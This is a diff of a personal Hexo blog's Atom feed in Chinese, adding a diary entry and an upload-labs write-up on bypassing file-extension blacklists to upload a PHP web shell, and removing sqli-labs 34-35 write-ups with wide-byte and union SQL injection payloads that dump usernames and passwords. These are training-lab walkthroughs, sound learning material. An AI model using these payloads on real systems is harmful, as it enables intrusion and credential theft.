@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2022-11-24T18:04:15.492Z</updated>
+  <updated>2022-11-25T17:06:26.702Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -17,16 +17,62 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title></title>
+    <link href="http://example.com/2022/11/25/Diary_1125/"/>
+    <id>http://example.com/2022/11/25/Diary_1125/</id>
+    <published>2022-11-24T16:00:00.000Z</published>
+    <updated>2022-11-25T17:06:26.702Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="/images/%E5%87%89%E5%AE%AB%E6%98%A5%E6%97%A5.png" alt="凉宫春日"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我的生活一如既往，平淡且平静。不过今天似乎在乌鲁木齐没有那么安宁，然而我也做不了什么。逝者愿安息，生者愿平安。</p><h1 id="点滴"><a href="#点滴" class="headerlink" title="点滴"></a>点滴</h1><p>今天的学习状态还是比较满意的，只是学习时长不够长。今日杂务做完了，明天多学习，尤其English!<br>学到了一个小知识：喝水温度对65℃以上对口腔不好。感受到烫一般是50℃以上。<br>昨晚又晚睡了，这不好，再次提醒自己要早睡。早起吃早餐听听力。</p><h1 id="激进分子"><a href="#激进分子" class="headerlink" title="激进分子"></a>激进分子</h1><p>No progress without radicals.没有激进分子就没有进步。<br>这是我今天听听力，听到的一句话。其实没预料到，听听力也能听出一些深刻的话。遇到了一篇蛮有趣的文章。<br>想想其实的确如此，很多事物的改变就是来源于“激进分子”。当然，这个激进分子是广义上的。<br>比如乔布斯，在各个手机厂商都流行在手机上加更多的键时，他一意孤行选择了只给手机保留一个键，这何尝不是一种激进呢？<br>还有很多例子，都可以说明，激进并不一定是一件坏事。<br>社会的大多数人，都是倾向于稳定的。因此激进很容易被反对，也不会被大多数人所理解。这也意味着，激进分子是少数人的“特权”。<br>具前瞻性的言论未必会为时人所接受。但当时间证明了该言论的价值时，社会各界又会争相附和。<br>这就和之前的“不容，然后见君子”其实是联系到一起了。<br>本质上表达的思想是相同的。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>再借我一点时间吧，我会更珍惜的。</p>]]></content>
+    
+    
+    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/%E5%87%89%E5%AE%AB%E6%98%A5%E6%97%A5.png&quot; alt=&quot;凉宫春日&quot;&gt;&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
+    
+    
+    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
+    
+    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>upload-labs_5-10</title>
+    <link href="http://example.com/2022/11/25/upload-labs_5-10/"/>
+    <id>http://example.com/2022/11/25/upload-labs_5-10/</id>
+    <published>2022-11-24T16:00:00.000Z</published>
+    <updated>2022-11-25T16:07:56.943Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>刚翻过了一座山，又遇到了一条河。bug的问题真伤脑筋…<br>这三关比较像，所以一起写了。</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><h2 id="第5关"><a href="#第5关" class="headerlink" title="第5关"></a>第5关</h2><p><strong>黑名单过滤（后缀名特殊字符多写）</strong><br>尝试其它都无法成功，因此选择特殊字符重写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b.php. .         在php后加一个点，加一个空格，再加一个点，上传成功</span><br></pre></td></tr></table></figure><p>蚁剑按正常后缀连接成功。</p><h2 id="第6关"><a href="#第6关" class="headerlink" title="第6关"></a>第6关</h2><p><strong>黑名单过滤（大小写绕过）</strong><br>尝试其它都无法成功，因此选择大小写绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b.Php            任意改变php的大小写，上传成功</span><br></pre></td></tr></table></figure><p>正常情况下，蚁剑按正常后缀连接成功<br>PS: 我的出问题了，文件能上传，但打开文件时会出现HTTP500错误，没有找到原因，只能重装phpstudy解决</p><h2 id="第7关"><a href="#第7关" class="headerlink" title="第7关"></a>第7关</h2><p><strong>黑名单过滤（空格绕过）</strong><br>尝试其它都无法成功，因此选择空格绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b.php            在php后加一个空格，上传成功</span><br></pre></td></tr></table></figure><p>蚁剑按正常后缀连接成功</p><h2 id="第8关"><a href="#第8关" class="headerlink" title="第8关"></a>第8关</h2><p><strong>黑名单过滤（点绕过）</strong><br>尝试其它都无法成功，因此选择点绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b.php.          在php后加一个点，上传成功</span><br></pre></td></tr></table></figure><p>蚁剑按正常后缀连接成功</p><h2 id="第9关"><a href="#第9关" class="headerlink" title="第9关"></a>第9关</h2><p><strong>黑名单过滤（流文件绕过）</strong><br>尝试其它都无法成功，因此选择流文件绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b.php::$DATA    在php后加::$DATA，上传成功</span><br></pre></td></tr></table></figure><p>蚁剑按正常后缀连接成功</p><h2 id="第10关"><a href="#第10关" class="headerlink" title="第10关"></a>第10关</h2><p>方法和第5关相同，不过多叙述</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>遇事不决，重装解决</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Thunderclap_/article/details/108948611">upload-labs文件上传靶场实验通关教程攻略</a></p>]]></content>
+    
+    
+    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;刚翻过了一座山，又遇到了一条河。bug的问题真伤脑筋…&lt;br&gt;这三关比较像，所以一起写了。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="upload-labs" scheme="http://example.com/categories/upload-labs/"/>
+    
+    
+    <category term="upload-labs" scheme="http://example.com/tags/upload-labs/"/>
+    
+    <category term="蚁剑" scheme="http://example.com/tags/%E8%9A%81%E5%89%91/"/>
+    
+  </entry>
+  
+  <entry>
     <title>是非成败转头空</title>
     <link href="http://example.com/2022/11/24/Diary_1124/"/>
     <id>http://example.com/2022/11/24/Diary_1124/</id>
     <published>2022-11-23T16:00:00.000Z</published>
-    <updated>2022-11-24T18:04:15.492Z</updated>
+    <updated>2022-11-24T18:06:48.367Z</updated>
     
-    <content type="html"><![CDATA[<p><img src="/images/%E9%9D%A2%E7%A0%81122.png" alt="本间芽衣子"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>不知不觉过去了一天…</p><h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>You smiled and talked to me of nothing and I felt that for this I had been waiting long.<br>你微笑地看着我，不说一句话。而我知道，为了这个，我已经等待很久了。</p><h1 id="时间的认知"><a href="#时间的认知" class="headerlink" title="时间的认知"></a>时间的认知</h1><p>零点过的时候，骤然看了下日期，发现周五，以为明日是周末了。一种快乐从我心底迸发，是惊讶的喜悦。可我过了会儿发现，日期是零点过后看的，周五才刚刚开始。我就像走入了周五的循环，第一次认识的时候，它是<strong>末尾</strong>。第二次认识的时候，它是<strong>开始</strong>。下一次认识，恐怕又是<strong>末尾</strong>了吧。<br>好像有什么变了，好像什么都没变。变的是我的认知，不变的是世界的规律。</p><h1 id="一天"><a href="#一天" class="headerlink" title="一天"></a>一天</h1><p>突然想到了穆勒的《功利主义》，好久没读了。这里提醒自己一下，有时间去读。这本书的一些重要思想：</p><ul><li>高级快乐和低级快乐，快乐有质的不同</li><li>调和美德与幸福的冲突，美德也是一种幸福</li><li>正义是需要感性的力量，有别于利益</li></ul><p>早上本可吃早餐然后完成“检测”，但我不知道哪根筋抽了，居然在等无谓的人，浪费了足足半小时有余，甚至因此在十一点前就吃了午餐，实在糟糕。然而，因等了人，才知道有另外的渠道查看“码”。让我不禁想到了一句话：一个人能走得更快，一群人能走得更远。<br>所以，我的选择是御风而行，不浪费生命。<br>晚上听听力真糟糕，吵闹混乱使人效率变得低下，早点起听听力，学英语！</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>不敢相信，这篇短短日记写了半小时，又睡晚了可恶啊！</p>]]></content>
+    <content type="html"><![CDATA[<p><img src="/images/%E9%9D%A2%E7%A0%81122.jpg" alt="本间芽衣子"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>不知不觉过去了一天…</p><h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>You smiled and talked to me of nothing and I felt that for this I had been waiting long.<br>你微笑地看着我，不说一句话。而我知道，为了这个，我已经等待很久了。</p><h1 id="时间的认知"><a href="#时间的认知" class="headerlink" title="时间的认知"></a>时间的认知</h1><p>零点过的时候，骤然看了下日期，发现周五，以为明日是周末了。一种快乐从我心底迸发，是惊讶的喜悦。可我过了会儿发现，日期是零点过后看的，周五才刚刚开始。我就像走入了周五的循环，第一次认识的时候，它是<strong>末尾</strong>。第二次认识的时候，它是<strong>开始</strong>。下一次认识，恐怕又是<strong>末尾</strong>了吧。<br>好像有什么变了，好像什么都没变。变的是我的认知，不变的是世界的规律。</p><h1 id="一天"><a href="#一天" class="headerlink" title="一天"></a>一天</h1><p>突然想到了穆勒的《功利主义》，好久没读了。这里提醒自己一下，有时间去读。这本书的一些重要思想：</p><ul><li>高级快乐和低级快乐，快乐有质的不同</li><li>调和美德与幸福的冲突，美德也是一种幸福</li><li>正义需要感性的力量，有别于利益</li></ul><p>早上本可吃早餐然后完成“检测”，但我不知道哪根筋抽了，居然在等无谓的人，浪费了足足半小时有余，甚至因此在十一点前就吃了午餐，实在糟糕。然而，因等了人，才知道有另外的渠道查看“码”。让我不禁想到了一句话：一个人能走得更快，一群人能走得更远。<br>所以，我的选择是御风而行，不浪费生命。<br>晚上听听力真糟糕，吵闹混乱使人效率变得低下，早点起听听力，学英语！</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>不敢相信，这篇短短日记写了半小时，又睡晚了可恶啊！</p>]]></content>
     
     
-    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/%E9%9D%A2%E7%A0%81122.png&quot; alt=&quot;本间芽衣子&quot;&gt;&lt;/p&gt;</summary>
+    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/%E9%9D%A2%E7%A0%81122.jpg&quot; alt=&quot;本间芽衣子&quot;&gt;&lt;/p&gt;</summary>
     
     
     
@@ -432,56 +478,6 @@
     
     
     <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;本关涉及到了编码格式&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="SQL注入" scheme="http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
-    
-    <category term="sqli-labs" scheme="http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/sqli-labs/"/>
-    
-    
-    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
-    
-    <category term="sqli-labs" scheme="http://example.com/tags/sqli-labs/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>sqli-labs_34</title>
-    <link href="http://example.com/2022/11/18/sqli-labs_34/"/>
-    <id>http://example.com/2022/11/18/sqli-labs_34/</id>
-    <published>2022-11-17T16:00:00.000Z</published>
-    <updated>2022-11-18T10:49:02.447Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>gogogo</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><p>有两种方案：</p><h2 id="第1种"><a href="#第1种" class="headerlink" title="第1种"></a>第1种</h2><ol><li><p>测试并判断注入类型<br>和之前的32，33关差别不大，但是这回是POST提交方式<br>因为在url栏中输入 %df 主要是以 16进制形式输入，而在输入框输入 %df 则是以普通字符串输入的。<br>所以我们需要略作改变<br>绕过方法：有些汉字的编码为三个字节的编码，我们将三个字节拆开来看，前两个为一组，后面的那个和 \ 相编码为两字节绕过，从而使得单引号逃逸</p></li><li><p>猜解SQL查询语句中的字段数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">汉&#x27; order by 3 #</span><br></pre></td></tr></table></figure></li><li><p>爆出显示位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">汉&#x27; union select 1,2 #</span><br></pre></td></tr></table></figure></li><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">汉&#x27; union select version(),database() #</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">汉&#x27; union select 1,table_name from information_schema.tables where table_schema= database() limit 3,1 #</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">汉&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  #</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">汉&#x27; union select 1,(select group_concat(username,0x3a,password) from users) #</span><br></pre></td></tr></table></figure></li></ol><h2 id="第2种"><a href="#第2种" class="headerlink" title="第2种"></a>第2种</h2><ol><li><p>测试并判断注入类型<br>既然在输入栏不能直接输入，我们可以通过burp抓包来注入。</p></li><li><p>猜解SQL查询语句中的字段数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%df&#x27; order by 3 #</span><br></pre></td></tr></table></figure></li><li><p>爆出显示位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%df&#x27; union select 1,2 #</span><br></pre></td></tr></table></figure></li><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%df&#x27; union select version(),database() #</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%df&#x27; union select 1,table_name from information_schema.tables where table_schema= database() limit 3,1 #</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%df&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  #</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%df&#x27; union select 1,(select group_concat(username,0x3a,password) from users) #</span><br></pre></td></tr></table></figure></li></ol><h3 id="burp注入的另一种方案，在Hex栏修改16进制注入为df。"><a href="#burp注入的另一种方案，在Hex栏修改16进制注入为df。" class="headerlink" title="burp注入的另一种方案，在Hex栏修改16进制注入为df。"></a>burp注入的另一种方案，在Hex栏修改16进制注入为df。</h3><p>可参见：<a href="https://blog.csdn.net/m0_62879498/article/details/122558222">sql-lab (32~35)包含对 宽字节注入的原理理解及注意事项</a><br>虽然不算很实用的方法，但也不失为一种有趣的思路。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>稍微改了个形式罢了，不足挂齿</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/qq_41420747/article/details/81836327">sqli-lab教程——1-35通关Writeup</a><br><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>]]></content>
-    
-    
-    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;gogogo&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="SQL注入" scheme="http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
-    
-    <category term="sqli-labs" scheme="http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/sqli-labs/"/>
-    
-    
-    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
-    
-    <category term="sqli-labs" scheme="http://example.com/tags/sqli-labs/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>sqli-labs_35</title>
-    <link href="http://example.com/2022/11/18/sqli-labs_35/"/>
-    <id>http://example.com/2022/11/18/sqli-labs_35/</id>
-    <published>2022-11-17T16:00:00.000Z</published>
-    <updated>2022-11-18T11:10:55.578Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>题目的提示已经很明显了</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li><p>测试并判断注入类型<br>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;SET NAMES gbk&quot;</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure><p>通过这段源码，我们可以知道，id没有被单引号括起来所以addslashes起不到作用<br>直接payload即可</p></li><li><p>猜解SQL查询语句中的字段数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 order by 4 --+</span><br></pre></td></tr></table></figure></li><li><p>爆出显示位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,2,3 --+</span><br></pre></td></tr></table></figure></li><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,version(),database() --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,2,(select group_concat(username,0x3a,password) from users) #</span><br></pre></td></tr></table></figure></li></ol><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>看破陷阱后，其实很简单</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>]]></content>
-    
-    
-    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;题目的提示已经很明显了&lt;/p&gt;</summary>
     
     
     
